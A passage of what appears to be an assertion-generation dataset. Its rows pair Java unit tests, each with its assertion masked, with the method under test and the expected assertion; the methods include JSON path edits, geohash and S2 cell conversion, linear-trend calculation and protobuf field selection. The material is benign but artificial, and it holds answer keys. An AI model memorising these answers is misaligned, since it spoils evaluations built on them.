getPosition(Timestamp startTime, Timestamp hopStartTime, Double window) { long hopStartMS = hopStartTime.getTime(); long startMS = startTime.getTime();  long reversePosition = Math.round((startMS - hopStartMS)) / MILLI_SECONDS_IN_MINUTE;  double position = window - 1.0 - (double) reversePosition;  return position; }"	assertEquals(2.0, ExponentialMovingAverage.getPosition(startTime, hopStartTime, window), 0.0000001)
"shouldConvertLocationToS2Id() { String actualS2Id = converter.eval(CENTRAL_MONUMENT_JAKARTA_LATITUDE, CENTRAL_MONUMENT_JAKARTA_LONGITUDE, GEOHASH_LENGTH);  ""<AssertPlaceHolder>""; }
eval(Double latitude, Double longitude, Integer length) { return encodeHash(latitude, longitude, length); }"	assertEquals(actualS2Id, CENTRAL_MONUMENT_JAKARTA_GEOHASH_LENGTH_6)
"shouldDeleteValueAndReturnAsJsonString() { JsonDelete jsonDelete = new JsonDelete(); String jsonEvent = ""{""k1"":""v1"",""k2"":""v2""}""; String expectedJsonEvent = ""{""k1"":""v1""}""; String jPath = ""$.k2""; String actual = jsonDelete.eval(jsonEvent, jPath); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).delete(JsonPath.compile(jPath)).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldDeleteNodeValueAndReturnAsJsonString() { JsonDelete jsonDelete = new JsonDelete(); String jsonEvent = ""{""k1"":""v1"",""k2"":{""key1"":""value1"",""key2"":""value2"",""key3"":""value3""}}""; String expectedJsonEvent = ""{""k1"":""v1""}""; String jPath = ""$.k2""; String actual = jsonDelete.eval(jsonEvent, jPath); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).delete(JsonPath.compile(jPath)).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldDeleteNestedValueAndReturnAsJsonString() { JsonDelete jsonDelete = new JsonDelete(); String jsonEvent = ""{""k1"":""v1"",""k2"":{""key1"":""value1"",""key2"":""value2"",""key3"":""value3""}}""; String expectedJsonEvent = ""{""k1"":""v1"",""k2"":{""key2"":""value2"",""key3"":""value3""}}""; String jPath = ""$.k2.key1""; String actual = jsonDelete.eval(jsonEvent, jPath); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).delete(JsonPath.compile(jPath)).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldDeleteArrayValueAndReturnAsJsonString() { JsonDelete jsonDelete = new JsonDelete(); String jsonEvent = ""{""k1"":""v1"",""k2"":[""value1"",""value2"",""value3""]}""; String expectedJsonEvent = ""{""k1"":""v1"",""k2"":[""value1"",""value3""]}""; String jPath = ""$.k2[1]""; String actual = jsonDelete.eval(jsonEvent, jPath); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).delete(JsonPath.compile(jPath)).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldReturnEmptyJsonAsJsonString() { JsonDelete jsonDelete = new JsonDelete(); String jsonEvent = ""{""k1"":""v1"",""k2"":[""value1"",""value2"",""value3""]}""; String expectedJsonEvent = ""{}""; String jPath = ""$..*""; String actual = jsonDelete.eval(jsonEvent, jPath); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).delete(JsonPath.compile(jPath)).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"JsonProcessingException { JsonQuery jsonQuery = new JsonQuery(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String expectedJsonEvent = """"v2""""; String jPath = ""$.k2""; Assert.""<AssertPlaceHolder>""; }
eval(@DataTypeHint(""STRING"") String jsonEvent, @DataTypeHint(""STRING"") String jPath) throws JsonProcessingException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); Object jChildObject = JsonPath.using(configuration).parse(jsonEvent).read(JsonPath.compile(jPath)); ObjectMapper mapper = new ObjectMapper(); mapper.setSerializationInclusion(JsonInclude.Include.USE_DEFAULTS); return Objects.isNull(jChildObject) ? null : mapper.writeValueAsString(jChildObject); }"	assertEquals(expectedJsonEvent, jsonQuery.eval(jsonEvent, jPath))
"JsonProcessingException { JsonQuery jsonQuery = new JsonQuery(); String expectedJsonEvent = ""{""key1"":""value1"",""key2"":""value2""}""; String jsonEvent = ""{""k1"":null,""k2"":{""key1"":""value1"",""key2"":""value2""}}""; String jPath = ""$.k2""; Assert.""<AssertPlaceHolder>""; }
eval(@DataTypeHint(""STRING"") String jsonEvent, @DataTypeHint(""STRING"") String jPath) throws JsonProcessingException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); Object jChildObject = JsonPath.using(configuration).parse(jsonEvent).read(JsonPath.compile(jPath)); ObjectMapper mapper = new ObjectMapper(); mapper.setSerializationInclusion(JsonInclude.Include.USE_DEFAULTS); return Objects.isNull(jChildObject) ? null : mapper.writeValueAsString(jChildObject); }"	assertEquals(expectedJsonEvent, jsonQuery.eval(jsonEvent, jPath))
"JsonProcessingException { JsonQuery jsonQuery = new JsonQuery(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String jPath = ""$.k1""; String result = jsonQuery.eval(jsonEvent, jPath); Assert.""<AssertPlaceHolder>""; }
eval(@DataTypeHint(""STRING"") String jsonEvent, @DataTypeHint(""STRING"") String jPath) throws JsonProcessingException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); Object jChildObject = JsonPath.using(configuration).parse(jsonEvent).read(JsonPath.compile(jPath)); ObjectMapper mapper = new ObjectMapper(); mapper.setSerializationInclusion(JsonInclude.Include.USE_DEFAULTS); return Objects.isNull(jChildObject) ? null : mapper.writeValueAsString(jChildObject); }"	assertNull(result)
"shouldReturnAddedJsonStringForEmptyJsonWithNewKeyValue() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{}""; String expectedJsonEvent = ""{""k1"":""v1""}""; String jPath = ""$.k1""; String updateValue = ""v1""; String actual = jsonUpdate.eval(jsonEvent, jPath, updateValue); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldReturnAddedJsonStringForNewKeyValuePair() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String expectedJsonEvent = ""{""k1"":null,""k2"":""v2"",""k3"":""v3""}""; String jPath = ""$.k3""; String updateValue = ""v3""; Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, jsonUpdate.eval(jsonEvent, jPath, updateValue))
"shouldReturnAddedJsonString() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String expectedJsonEvent = ""{""k1"":null,""k2"":""updatedValue""}""; String jPath = ""$.k2""; String updateValue = ""updatedValue""; Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, jsonUpdate.eval(jsonEvent, jPath, updateValue))
"shouldReturnAddedJsonStringForNestedJson() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":{""key1"":""value1"",""key2"":""value2""}}""; String expectedJsonEvent = ""{""k1"":null,""k2"":{""key1"":""value1"",""key2"":""value2"",""key3"":""value3""}}""; String jPath = ""$.k2.key3""; String updateValue = ""value3""; String actual = jsonUpdate.eval(jsonEvent, jPath, updateValue); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldReturnUpdatedJsonStringForNestedJson() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String expectedJsonEvent = ""{""k1"":null,""k2"":{""key1"":""value1"",""key2"":""value2""}}""; String jPath = ""$.k2""; Map<String, String> updateValue = new HashMap<String, String>() {{ put(""key1"", ""value1""); put(""key2"", ""value2""); }}; Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, jsonUpdate.eval(jsonEvent, jPath, updateValue))
"shouldReturnUpdatedJsonStringForNullValue() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String expectedJsonEvent = ""{""k1"":null,""k2"":null}""; String jPath = ""$.k2""; String updateValue = null; Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, jsonUpdate.eval(jsonEvent, jPath, updateValue))
"shouldReturnUpdatedJsonStringForNewNestedKeyValue() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":""v2""}""; String expectedJsonEvent = ""{""k1"":null,""k2"":""v2"",""k3"":{""key1"":""value1"",""key2"":""value2""}}""; String jPath = ""$.k3""; Map<String, String> updateValue = new HashMap<String, String>() {{ put(""key1"", ""value1""); put(""key2"", ""value2""); }}; String actual = jsonUpdate.eval(jsonEvent, jPath, updateValue); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldReturnUpdatedJsonStringForNewNestedKeyValueInNestedPath() { JsonUpdate jsonUpdate = new JsonUpdate(); String jsonEvent = ""{""k1"":null,""k2"":""v2"",""k3"":{""nk1"":""nv1"",""nk2"":""nv2""}}""; String expectedJsonEvent = ""{""k1"":null,""k2"":""v2"",""k3"":{""nk1"":{""key1"":""value1"",""key2"":""value2""},""nk2"":""nv2""}}""; String jPath = ""$.k3.nk1""; Map<String, String> updateValue = new HashMap<String, String>() {{ put(""key1"", ""value1""); put(""key2"", ""value2""); }}; String actual = jsonUpdate.eval(jsonEvent, jPath, updateValue); Assert.""<AssertPlaceHolder>""; }
eval(String jsonEvent, String jPath, @DataTypeHint(inputGroup = InputGroup.ANY) Object newValue) throws PathNotFoundException { Configuration configuration = Configuration.defaultConfiguration().setOptions(Option.DEFAULT_PATH_LEAF_TO_NULL); return JsonPath.using(configuration).parse(jsonEvent).set(JsonPath.compile(jPath), newValue).jsonString(); }"	assertEquals(expectedJsonEvent, actual)
"shouldReturnGradientWhenNoMetricValueIsMissingInHopWindow() { ArrayList<LocalDateTime> localDateTimes = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<Double>();  long timeInMillis = System.currentTimeMillis();  int windowSize = 5; LocalDateTime localDateTime = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); localDateTimes.add(localDateTime); localDateTimes.add(localDateTime.plusSeconds(60)); localDateTimes.add(localDateTime.plusSeconds(120)); localDateTimes.add(localDateTime.plusSeconds(180)); localDateTimes.add(localDateTime.plusSeconds(240));  metricList.add(0.0); metricList.add(2.0); metricList.add(1.0); metricList.add(4.0); metricList.add(4.0);  double beta = linearTrend.eval(localDateTimes, metricList, localDateTime, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(1.0, beta, 0)
"shouldReturnGradientWhenTwoMetricValuesAreMissingInHopWindow() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<Double>();  long timeInMillis = System.currentTimeMillis();  int windowSize = 5; LocalDateTime now = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); timestampsList.add(now); timestampsList.add(now.plusSeconds(120)); timestampsList.add(now.plusSeconds(240));  metricList.add(2.0); metricList.add(1.0); metricList.add(4.0); double beta = linearTrend.eval(timestampsList, metricList, now, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(0.4, beta, 0)
"shouldReturnGradientWhenThreeMetricValuesAreMissingInHopWindow() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<Double>();  long timeInMillis = System.currentTimeMillis();  int windowSize = 5; LocalDateTime now = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); timestampsList.add(now.plusSeconds(60)); timestampsList.add(now.plusSeconds(180));  metricList.add(2.0); metricList.add(1.0);  double beta = linearTrend.eval(timestampsList, metricList, now, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(-0.1, beta, 0)
"shouldReturnGradientWhenOnlyOneValueInHopWindow() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<>();  long timeInMillis = System.currentTimeMillis(); LocalDateTime now = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); int windowSize = 5;  timestampsList.add(now.plusSeconds(60));  metricList.add(2.0);  double beta = linearTrend.eval(timestampsList, metricList, now, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(-0.2, beta, 0)
"shouldReturnGradientWhenNoValueInHopWindow() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<>();   int windowSize = 5;  double beta = linearTrend.eval(timestampsList, metricList, LocalDateTime.now(), windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(0.0, beta, 0)
"shouldReturnGradientWhenAllMetricValuesAreNonEmptyAndSameInHopWindow() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<>();  long timeInMillis = System.currentTimeMillis(); LocalDateTime now = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); int windowSize = 5;  timestampsList.add(now); timestampsList.add(now.plusSeconds(60)); timestampsList.add(now.plusSeconds(120)); timestampsList.add(now.plusSeconds(180)); timestampsList.add(now.plusSeconds(240));  metricList.add(2.0); metricList.add(2.0); metricList.add(2.0); metricList.add(2.0); metricList.add(2.0);  double beta = linearTrend.eval(timestampsList, metricList, now, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(0.0, beta, 0)
"shouldReturnCorrectGradientWithOutOfOrderValues() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<>();  long timeInMillis = System.currentTimeMillis();  int windowSize = 20; LocalDateTime now = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); timestampsList.add(now.plusSeconds(60)); timestampsList.add(now.plusSeconds(180)); timestampsList.add(now.plusSeconds(300)); timestampsList.add(now.plusSeconds(1140)); timestampsList.add(now.plusSeconds(420)); timestampsList.add(now.plusSeconds(480)); timestampsList.add(now.plusSeconds(600)); timestampsList.add(now.plusSeconds(660));  metricList.add(1.0); metricList.add(1.0); metricList.add(2.0); metricList.add(1.0); metricList.add(2.0); metricList.add(2.0); metricList.add(1.0); metricList.add(1.0);  double beta = linearTrend.eval(timestampsList, metricList, now, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(-0.030827067669172932, beta, 0)
"shouldReturnCorrectGradientWithDuplicateValues() { ArrayList<LocalDateTime> timestampsList = new ArrayList<>(); ArrayList<Double> metricList = new ArrayList<>();  long timeInMillis = System.currentTimeMillis(); LocalDateTime now = LocalDateTime.ofInstant(Instant.ofEpochMilli(timeInMillis), ZoneId.systemDefault()); int windowSize = 20;  timestampsList.add(now.plusSeconds(60)); timestampsList.add(now.plusSeconds(180)); timestampsList.add(now.plusSeconds(300)); timestampsList.add(now.plusSeconds(420)); timestampsList.add(now.plusSeconds(480)); timestampsList.add(now.plusSeconds(600)); timestampsList.add(now.plusSeconds(660)); timestampsList.add(now.plusSeconds(660)); timestampsList.add(now.plusSeconds(1140));  metricList.add(1.0); metricList.add(1.0); metricList.add(2.0); metricList.add(2.0); metricList.add(2.0); metricList.add(1.0); metricList.add(1.0); metricList.add(1.0); metricList.add(1.0);  double beta = linearTrend.eval(timestampsList, metricList, now, windowSize); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<LocalDateTime> localDateTimeArray, @DataTypeHint(value = ""RAW"", bridgedTo = ArrayList.class) ArrayList<Double> values, LocalDateTime hopStartTime, Integer windowLengthInMinutes) { ArrayList<Timestamp> timestamps = new ArrayList<Timestamp>(); localDateTimeArray.forEach(localDateTime -> timestamps.add(Timestamp.valueOf(localDateTime))); return calculateLinearTrend(timestamps, values, Timestamp.valueOf(hopStartTime), windowLengthInMinutes); }"	assertEquals(-0.030827067669172932, beta, 0)
"shouldReturnFalseForNullItem() { ListContains listContains = new ListContains(); String[] inputArray = {""test1"", ""test2""}; Assert.""<AssertPlaceHolder>""; }
eval(String[] inputList, String item) { if (inputList == null) { return false; } return Arrays.asList(inputList).contains(item); }"	assertFalse(listContains.eval(inputArray, null))
"shouldGetValueForValueForGivenKeyInGivenMap() { ArrayList<Row> rows = new ArrayList<>(); Row row1 = new Row(2); String expectedValue = ""0.4""; row1.setField(0, ""payment_switch""); row1.setField(1, ""PB-123456""); Row row2 = new Row(2); row2.setField(0, ""weighted_abuse_probability""); row2.setField(1, expectedValue); String givenKey = ""weighted_abuse_probability"";  rows.add(row1); rows.add(row2);   MapGet mapGet = new MapGet(); Object actualValue = mapGet.eval(rows.toArray(new Row[0]), givenKey);  ""<AssertPlaceHolder>""; }
eval(Row[] inputMap, Object key) { List<Row> rows = Arrays.asList(inputMap); Optional<Row> requiredRow = rows.stream().filter(row -> row.getField(0).equals(key)).findFirst(); return requiredRow.map(row -> row.getField(1)).orElse(null); }"	assertEquals(expectedValue, actualValue)
"shouldGetIntValueForValueForGivenKeyInGivenMap() { ArrayList<Row> rows = new ArrayList<>(); Row row1 = new Row(2); int expectedValue = 4; row1.setField(0, ""payment_switch""); row1.setField(1, ""PB-123456""); Row row2 = new Row(2); row2.setField(0, ""weighted_abuse_probability""); row2.setField(1, expectedValue); String givenKey = ""weighted_abuse_probability"";  rows.add(row1); rows.add(row2);   MapGet mapGet = new MapGet(); Object actualValue = mapGet.eval(rows.toArray(new Row[0]), givenKey);  ""<AssertPlaceHolder>""; }
eval(Row[] inputMap, Object key) { List<Row> rows = Arrays.asList(inputMap); Optional<Row> requiredRow = rows.stream().filter(row -> row.getField(0).equals(key)).findFirst(); return requiredRow.map(row -> row.getField(1)).orElse(null); }"	assertEquals(expectedValue, actualValue)
"shouldReturnNullIfValueIsNotPresentInGivenMap() { ArrayList<Row> rows = new ArrayList<>(); Row row1 = new Row(2); int expectedValue = 4; row1.setField(0, ""payment_switch""); row1.setField(1, ""PB-123456""); Row row2 = new Row(2); row2.setField(0, ""weighted_abuse_probability""); row2.setField(1, expectedValue); String givenKey = ""abuse_probability"";  rows.add(row1); rows.add(row2);  MapGet valueForKeyInMap = new MapGet(); Object actualValue = valueForKeyInMap.eval(rows.toArray(new Row[0]), givenKey);  ""<AssertPlaceHolder>""; }
eval(Row[] inputMap, Object key) { List<Row> rows = Arrays.asList(inputMap); Optional<Row> requiredRow = rows.stream().filter(row -> row.getField(0).equals(key)).findFirst(); return requiredRow.map(row -> row.getField(1)).orElse(null); }"	assertNull(actualValue)
"outputStrategy() { TypeStrategy typeStrategy = new MapGet().getTypeInference(null).getOutputTypeStrategy(); CallContext mock = mock(CallContext.class); DataType firstArgument = DataTypes.ARRAY(DataTypes.ROW(DataTypes.STRING(), DataTypes.STRING())); DataType secondArgument = DataTypes.STRING(); List<DataType> dataTypeList = Arrays.asList(firstArgument, secondArgument); when(mock.getArgumentDataTypes()).thenReturn(dataTypeList);  Optional<DataType> dataType = typeStrategy.inferType(mock);  DataType expectedDataType = DataTypes.STRING(); ""<AssertPlaceHolder>""; }
inferType(CallContext callContext) { CollectionDataType firstArgumentDataType = (CollectionDataType) callContext.getArgumentDataTypes().get(0); FieldsDataType elementDataType = (FieldsDataType) firstArgumentDataType.getElementDataType(); List<DataType> children = elementDataType.getChildren(); return Optional.of(children.get(1)); }"	assertEquals(Optional.of(expectedDataType), dataType)
"shouldComputAreaForS2Id() { double actualArea = converter.eval(TEST_S2ID);  ""<AssertPlaceHolder>""; }
eval(String s2id) { long id = Long.parseLong(s2id); S2Cell s2Cell = getS2CellfromId(id); return (s2Cell.exactArea() * TOTAL_EARTH_AREA_KM2) / (FACTOR * Math.PI); }"	assertEquals(actualArea, TEST_AREA, 0.0001)
"shouldConvertLocationToS2Id() { String actualS2Id = converter.eval(CENTRAL_MONUMENT_JAKARTA_LATITUDE, CENTRAL_MONUMENT_JAKARTA_LONGITUDE, S2LEVEL);  ""<AssertPlaceHolder>""; }
eval(Double latitude, Double longitude, Integer level) { S2LatLng s2LatLng = S2LatLng.fromDegrees(latitude, longitude); return Long.toString(S2CellId.fromLatLng(s2LatLng).parent(level).id()); }"	assertEquals(actualS2Id, CENTRAL_MONUMENT_JAKARTA_S2ID_LEVEL_13)
"shouldThrowNPEForInvalidInput() { String actualS2Id = converter.eval(null, CENTRAL_MONUMENT_JAKARTA_LONGITUDE, S2LEVEL);  ""<AssertPlaceHolder>""; }
eval(Double latitude, Double longitude, Integer level) { S2LatLng s2LatLng = S2LatLng.fromDegrees(latitude, longitude); return Long.toString(S2CellId.fromLatLng(s2LatLng).parent(level).id()); }"	assertEquals(actualS2Id, CENTRAL_MONUMENT_JAKARTA_S2ID_LEVEL_13)
"Exception { String orderNumber = ""test_order_number""; ByteString testBookingLogByteString = TestBookingLogMessage.newBuilder().setOrderNumber(orderNumber).build().toByteString();  SelectFields selectFields = new SelectFields(stencilClient);  ByteString[] byteStrings = new ByteString[1]; byteStrings[0] = testBookingLogByteString;  selectFields.open(functionContext); Object[] selectedFields = selectFields.eval(byteStrings, ""org.raystack.dagger.consumer.TestBookingLogMessage"", ""order_number"");  ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(inputGroup = InputGroup.ANY) Object inputProtoBytes, String protoClassName, String fieldPath) throws InvalidProtocolBufferException, ClassNotFoundException { if (!(inputProtoBytes instanceof ByteString[])) { return null; } ByteString[] inputData = (ByteString[]) inputProtoBytes; Descriptors.Descriptor descriptor = getDescriptor(protoClassName);  ArrayList<Object> output = new ArrayList<>(inputData.length); List<String> keys = new LinkedList<>(Arrays.asList(fieldPath.split(""\\."")));  for (ByteString protoByte : inputData) { DynamicMessage dynamicMessage = DynamicMessage.parseFrom(descriptor, protoByte); output.add(messageParser.read(dynamicMessage, keys)); } return output.toArray(new Object[0]); }"	"assertEquals(selectedFields[0], ""test_order_number"")"
"Exception { String orderNumber = ""test_order_number""; TestBookingLogMessage testBookingLogMessage = TestBookingLogMessage.newBuilder().setOrderNumber(orderNumber).build(); DynamicMessage dynamicMessage = DynamicMessage.newBuilder(testBookingLogMessage).build();  SelectFields selectFields = new SelectFields(stencilClient); selectFields.open(functionContext); Object[] outputOrderNumbers = selectFields.eval(Collections.singletonList(dynamicMessage), ""order_number"");  ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = List.class) List<DynamicMessage> filteredData, String fieldPath) { ArrayList<Object> output = new ArrayList<>(filteredData.size()); List<String> keys = new LinkedList<>(Arrays.asList(fieldPath.split(""\\."")));  filteredData.forEach(dynamicMessage -> { output.add(messageParser.read(dynamicMessage, keys)); }); return output.toArray(new Object[0]); }"	"assertEquals(outputOrderNumbers[0], ""test_order_number"")"
